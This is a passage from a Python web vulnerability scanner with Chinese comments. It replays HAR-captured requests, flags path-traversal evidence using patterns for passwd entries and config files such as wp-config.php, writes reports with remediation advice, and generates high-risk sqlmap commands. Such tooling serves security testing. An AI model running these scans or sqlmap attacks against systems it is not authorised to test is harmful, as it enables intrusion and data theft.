            
        # 检查文件内容特征
        file_patterns = {
            'unix_files': [
                # Unix系统文件
                r'root:.*:0:0:', r'bin:.*:/bin/bash',
                r'nobody:.*:/sbin/nologin',
                r'/etc/[a-zA-Z0-9]+$', r'/var/log/[a-zA-Z0-9]+',
                r'Location: file:///etc/'
            ],
            'windows_files': [
                # Windows系统文件
                r'\[boot loader\]', r'\[fonts\]',
                r'fonts.fon', r'system.ini',
                r'Location: file:///C:/',
                r'C:\\Windows\\System32'
            ],
            'config_files': [
                # 配置文件
                r'<?php', r'<%@\s+page',
                r'web.config', r'.htaccess',
                r'httpd.conf', r'nginx.conf',
                r'config.php', r'wp-config.php'
            ],
            'db_files': [
                # 数据库文件
                r'mysql.sock', r'my.cnf',
                r'postgresql.conf', r'sqlite3.db',
                r'.sqlite', r'.db'
            ]
        }
        
        # 检查每种类型的特征
        for file_type, patterns in file_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE) and \
                   not re.search(pattern, base_text, re.IGNORECASE):
                    self.logger.debug(f"Found {file_type} pattern: {pattern}")
                    return True
                    
        # 检查响应类型变化
        base_type = base_response.headers.get('Content-Type', '').lower()
        response_type = response.headers.get('Content-Type', '').lower()
        if base_type != response_type:
            self.logger.debug(f"Content-Type changed: {base_type} -> {response_type}")
            return True
            
        # 检查错误消息
        error_patterns = [
            r'permission denied',
            r'access denied',
            r'error.*file.*not found',
            r'system cannot find.*file',
            r'failed to open stream',
            r'directory listing.*denied'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE) and \
               not re.search(pattern, base_text, re.IGNORECASE):
                return True

        return False

    def get_vulnerability_evidence(self, response: requests.Response, 
                                 base_response: requests.Response) -> Dict[str, Any]:
        """获取增强的漏洞证据"""
        evidence = {
            'request': {
                'url': response.request.url,
                'method': response.request.method,
                'headers': dict(response.request.headers),
                'body': response.request.body
            },
            'response': {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'length': len(response.text),
                'response_time': response.elapsed.total_seconds()
            },
            'base_response': {
                'status_code': base_response.status_code,
                'length': len(base_response.text),
                'response_time': base_response.elapsed.total_seconds()
            },
            'differences': {
                'status_code_changed': response.status_code != base_response.status_code,
                'length_difference': len(response.text) - len(base_response.text),
                'time_difference': response.elapsed.total_seconds() - base_response.elapsed.total_seconds()
            }
        }
        
        # 添加SQL注入特定的证据
        try:
            response_json = response.json()
            if 'error' in response_json:
                evidence['sql_error'] = {
                    'code': response_json.get('error', {}).get('code'),
                    'errno': response_json.get('error', {}).get('errno'),
                    'sqlState': response_json.get('error', {}).get('sqlState'),
                    'sqlMessage': response_json.get('error', {}).get('sqlMessage'),
                    'sql': response_json.get('error', {}).get('sql')
                }
        except ValueError:
            pass
            
        return evidence

    def generate_report(self, vulnerabilities: List[Dict[str, Any]]):
        """生成漏洞报告"""
        report_file = os.path.join(self.output_dir, 'vulnerability_report.txt')
        
        with open(report_file, 'w', encoding='utf-8') as f:
            # 报告头部
            f.write('Web Vulnerability Scan Report\n')
            f.write('=' * 80 + '\n')
            f.write(f'Scan Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n')
            f.write(f'Total Vulnerabilities: {len(vulnerabilities)}\n')
            f.write('=' * 80 + '\n\n')

            # 统计信息
            vuln_types = {}
            severity_count = {'high': 0, 'medium': 0, 'low': 0}
            
            for vuln in vulnerabilities:
                vuln_type = vuln['type']
                vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
                severity = self.get_vulnerability_severity(vuln_type)
                severity_count[severity] += 1
            
            # 写入统计信息
            f.write('Vulnerability Statistics:\n')
            f.write('-' * 40 + '\n')
            f.write('By Severity:\n')
            for severity, count in severity_count.items():
                f.write(f'- {severity.upper()}: {count}\n')
            
            f.write('\nBy Type:\n')
            for vuln_type, count in vuln_types.items():
                f.write(f'- {vuln_type}: {count}\n')
            f.write('\n' + '=' * 80 + '\n\n')

            # 详细漏洞信息
            f.write('Detailed Vulnerability Findings:\n\n')
            for i, vuln in enumerate(vulnerabilities, 1):
                f.write(f'Finding #{i}\n')
                f.write('-' * 40 + '\n')
                f.write(f'Type: {vuln["type"]}\n')
                if 'subtype' in vuln:
                    f.write(f'Subtype: {vuln["subtype"]}\n')
                f.write(f'Severity: {self.get_vulnerability_severity(vuln["type"]).upper()}\n')
                f.write(f'URL: {vuln["url"]}\n')
                f.write(f'Method: {vuln["method"]}\n')
                f.write(f'Parameter: {vuln["parameter"]}\n')
                f.write(f'Payload: {vuln["payload"]}\n\n')

                # 证据详情
                evidence = vuln["evidence"]
                f.write('Evidence Details:\n')
                f.write(f'- Response Code: {evidence["response"]["status_code"]}\n')
                f.write(f'- Response Length: {evidence["response"]["length"]}\n')
                f.write(f'- Response Time: {evidence["response"]["response_time"]}s\n')
                
                if evidence["differences"].get("new_words"):
                    f.write('- New Keywords Found:\n  ')
                    f.write(', '.join(evidence["differences"]["new_words"][:10]) + '\n')
                
                # 添加修复建议
                f.write('\nRemediation:\n')
                f.write(self.get_recommendation(vuln["type"]))
                f.write('\n' + '=' * 80 + '\n\n')

        self.logger.info(f"Report generated: {report_file}")

    def generate_sqlmap_command(self, vuln_info: Dict[str, Any]) -> str:
        """生成SQLMap扫描命令"""
        url = vuln_info['url']
        parameter = vuln_info['parameter']
        method = vuln_info.get('method', 'GET')
        
        sqlmap_options = [
            f'sqlmap -u "{url}"',               
            f'-p {parameter}',                   
            '--batch',                           
            '--random-agent',                    
            '--risk=3',                          
            '--level=5',                         
            '--threads=10',                      
            '--time-sec=10',                     
            '--timeout=30',                      
            '--proxy=http://127.0.0.1:8080'     
        ]
        
        # 根据不同的注入类型添加特定选项
        if 'subtype' in vuln_info:
            if vuln_info['subtype'] == 'time_based':
                sqlmap_options.extend([
                    '--technique=T',
                    '--time-sec=10'
                ])
            elif vuln_info['subtype'] == 'error_based':
                sqlmap_options.extend([
                    '--technique=E'
                ])
            elif vuln_info['subtype'] == 'union_based':
                sqlmap_options.extend([
                    '--technique=U',
                    '--union-cols=10'
                ])
            elif vuln_info['subtype'] == 'boolean_based':
                sqlmap_options.extend([
                    '--technique=B'
                ])

        # POST请求特定选项
        if method == 'POST':
            sqlmap_options.extend([
                '--method=POST',
                '--data="' + urlencode(vuln_info.get('post_data', {})) + '"'
            ])
        
        # 如果有证据中的headers，添加到命令中
        if 'evidence' in vuln_info and 'request' in vuln_info['evidence']:
            headers = vuln_info['evidence']['request'].get('headers', {})
            headers_str = []
            for name, value in headers.items():
                if name.lower() not in ['content-length', 'host']:
                    headers_str.append(f"{name}: {value}")
            if headers_str:
                sqlmap_options.append('--headers="' + '\n'.join(headers_str) + '"')

        return ' \\\n    '.join(sqlmap_options)

    def get_recommendation(self, vuln_type: str) -> str:
        """获取漏洞修复建议"""
        recommendations = {
            'SQL Injection': '''
            SQL注入修复建议：
            1. 使用参数化查询或预编译语句
            2. 实施严格的输入验证和过滤
            3. 使用ORM框架
            4. 限制数据库账户权限
            5. 禁用错误信息详细输出
            6. 使用WAF进行防护
            7. 定期进行安全审计
            ''',
            'XSS': '''
            XSS防护建议：
            1. 对输入进行验证和过滤
            2. 对输出进行编码
            3. 实施内容安全策略(CSP)
            4. 使用现代框架的XSS保护功能
            5. 在cookie中使用HttpOnly标记
            6. 实施安全的响应头
            7. 定期进行安全培训
            ''',
            'Command Injection': '''
            命令注入防护建议：
            1. 避免直接执行系统命令
            2. 使用安全的API替代命令执行
            3. 实施严格的输入验证
            4. 使用白名单验证
            5. 以最小权限运行应用
            6. 禁用危险函数
            7. 使用沙箱环境
            ''',
            'Path Traversal': '''
            路径遍历防护建议：
            1. 规范化文件路径
            2. 实施严格的访问控制
            3. 使用安全的文件处理API
            4. 限制文件系统访问范围
            5. 实施白名单验证
            6. 避免将用户输入直接用于文件操作
            7. 定期审查文件访问日志
            '''
        }
        
        return recommendations.get(vuln_type, '''
            通用安全建议：
            1. 实施输入验证
            2. 实施访问控制
            3. 使用安全配置
            4. 保持系统更新
            5. 进行安全审计
            6. 实施日志记录
            7. 定期安全评估
            ''')

    def run_scan(self):
        """运行扫描"""
        scan_start = time.time()
        self.logger.info(f"{Fore.GREEN}Starting vulnerability scan...{Style.RESET_ALL}")
        
        # 测试代理连接
        if not self.test_proxy_connection():
            self.logger.error(f"{Fore.RED}Failed to connect to proxy. Please check proxy setup.{Style.RESET_ALL}")
            return
        
        # 提取请求信息
        requests_info = self.extract_requests()
        total_requests = len(requests_info)
        self.logger.info(f"Extracted {total_requests} requests from HAR file")
        
        # 显示扫描进度
        successful_scans = failed_scans = 0
        all_vulnerabilities = []
        
        try:
            # 创建进度条
            with tqdm(total=total_requests, desc="Scanning Requests") as pbar:
                for req_info in requests_info:
                    try:
                        self.logger.info(f"\nScanning: {req_info['url']}")
                        vulnerabilities = self.test_vulnerability(req_info)
                        
                        if vulnerabilities:
                            all_vulnerabilities.extend(vulnerabilities)
                            self.logger.warning(
                                f"{Fore.YELLOW}Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}"
                            )
                            
                        successful_scans += 1
                        
                    except Exception as e:
                        self.logger.error(f"Error scanning request: {str(e)}")
                        failed_scans += 1
                        
                    finally:
                        pbar.update(1)
                        
            # 生成报告
            if all_vulnerabilities:
                self.logger.warning(
                    f"\n{Fore.RED}Total vulnerabilities found: {len(all_vulnerabilities)}{Style.RESET_ALL}"
                )
                self.generate_report(all_vulnerabilities)
            else:
                self.logger.info(f"\n{Fore.GREEN}No vulnerabilities found.{Style.RESET_ALL}")
            
            # 打印统计信息
            self.print_final_statistics(total_requests, successful_scans, failed_scans, all_vulnerabilities)
            
        except KeyboardInterrupt:
            scan_time = time.time() - scan_start
            self.logger.warning(
                f"\n{Fore.YELLOW}Scan interrupted by user after {scan_time:.2f} seconds{Style.RESET_ALL}"
            )
            if all_vulnerabilities:
                self.generate_report(all_vulnerabilities)
                
        except Exception as e:
            self.logger.error(f"{Fore.RED}Scan error: {str(e)}{Style.RESET_ALL}")
            if all_vulnerabilities:
                self.generate_report(all_vulnerabilities)

    def print_final_statistics(self, total_requests: int, successful_scans: int, 
                             failed_scans: int, vulnerabilities: List[Dict[str, Any]]):
        """打印最终统计信息"""
        end_time = time.time()
        total_scan_time = end_time - self._scan_start_time
        
        print("\n" + "="*50)
        print(f"{Fore.CYAN}Scan Completed - Final Statistics{Style.RESET_ALL}")
        print("="*50)
        
        # 请求统计
        print(f"\n{Fore.BLUE}Request Statistics:{Style.RESET_ALL}")
        print(f"Total Requests Analyzed: {total_requests}")
        print(f"Successful Scans: {successful_scans}")
        print(f"Failed Scans: {failed_scans}")
        print(f"Success Rate: {(successful_scans/total_requests*100):.1f}%")
        
        # 性能统计
        print(f"\n{Fore.BLUE}Performance Statistics:{Style.RESET_ALL}")
        request_times = self._scan_statistics.get('request_times', [])
        if request_times:
            avg_request_time = sum(request_times) / len(request_times)
            max_request_time = max(request_times)
            min_request_time = min(request_times)
            print(f"Total Scan Time: {total_scan_time:.2f} seconds")
            print(f"Average Request Time: {avg_request_time:.2f} seconds")
            print(f"Fastest Request: {min_request_time:.2f} seconds")
            print(f"Slowest Request: {max_request_time:.2f} seconds")
            print(f"Requests per Second: {len(request_times)/total_scan_time:.2f}")
        
        # 漏洞统计
        print(f"\n{Fore.BLUE}Vulnerability Statistics:{Style.RESET_ALL}")
        
        if not vulnerabilities:
            print(f"{Fore.GREEN}No vulnerabilities found{Style.RESET_ALL}")
        else:
            # 按类型统计
            vuln_types = {}
            severity_count = {'high': 0, 'medium': 0, 'low': 0}
            
            for vuln in vulnerabilities:
                vuln_type = vuln['type']
                vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
                severity = self.get_vulnerability_severity(vuln_type)
                severity_count[severity] += 1
            
            # 打印按严重程度统计
            print("By Severity:")
            severity_colors = {
                'high': Fore.RED,
                'medium': Fore.YELLOW,
                'low': Fore.GREEN
            }
            
            for severity, count in severity_count.items():
                color = severity_colors.get(severity, Fore.WHITE)
                print(f"{color}{severity.upper()}: {count}{Style.RESET_ALL}")
            
            # 打印按类型统计
            print("\nBy Type:")
            for vuln_type, count in vuln_types.items():
                severity = self.get_vulnerability_severity(vuln_type)
                color = severity_colors.get(severity, Fore.WHITE)
                print(f"{color}{vuln_type}: {count}{Style.RESET_ALL}")
        
        # 输出路径
        print(f"\n{Fore.BLUE}Output Location:{Style.RESET_ALL}")
        print(f"Report Directory: {os.path.abspath(self.output_dir)}")
        print(f"Full Report: {os.path.join(self.output_dir, 'vulnerability_report.txt')}")
        print(f"Log File: {os.path.join(self.output_dir, 'scan.log')}")
        
        # 如果发现漏洞，提供进一步分析建议
        if vulnerabilities:
            print(f"\n{Fore.YELLOW}Recommendations:{Style.RESET_ALL}")
            print("1. Review the full report for detailed findings")
            print("2. Prioritize fixing high severity vulnerabilities")
            print("3. Consider using provided SQLMap/Ghauri commands for deeper analysis")
            print("4. Implement recommended security controls")
        
        print("\n" + "="*50)

    def get_vulnerability_severity(self, vuln_type: str) -> str:
        """获取漏洞严重程度"""
        severity_map = {
            'SQL Injection': 'high',
            'Command Injection': 'high',
            'Path Traversal': 'high',
            'XSS': 'medium',
            'CSRF': 'medium',
            'Open Redirect': 'medium',
            'Information Disclosure': 'medium',
            'Directory Listing': 'low',
            'Missing Headers': 'low'
        }
        return severity_map.get(vuln_type, 'medium')            

def main():
    """主函数"""
    # 初始化colorama
    colorama.init()
    
    print(f"{Fore.CYAN}Web Vulnerability Scanner{Style.RESET_ALL}")
    print("="*50)
    
    if len(sys.argv) < 2:
        print(f"{Fore.RED}Usage: python {sys.argv[0]} <har_file>{Style.RESET_ALL}")
        print("\nExample:")
        print(f"  python {sys.argv[0]} captured_traffic.har")
        sys.exit(1)
        
    parser = argparse.ArgumentParser(description="Web漏洞扫描")
    parser.add_argument("har_file", help="扫描HAR文件路径.")
    parser.add_argument("--proxy", help="扫描使用代理地址 (e.g., http://127.0.0.1:8080).", default=None)
    args = parser.parse_args()
    
    har_file = args.har_file
    proxy = args.proxy

    if not os.path.exists(har_file):
        print(f"{Fore.RED}Error: HAR file '{har_file}' not found{Style.RESET_ALL}")
        sys.exit(1)
    
    if not har_file.endswith('.har'):
        print(f"{Fore.YELLOW}Warning: File does not have .har extension{Style.RESET_ALL}")
        response = input("Continue anyway? (y/N): ")
        if response.lower() != 'y':
            sys.exit(0)
    
    try:
        scanner = WebVulnScanner(har_file, proxy)
        scanner.run_scan()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
    finally:
        colorama.deinit()

if __name__ == "__main__":
    main()     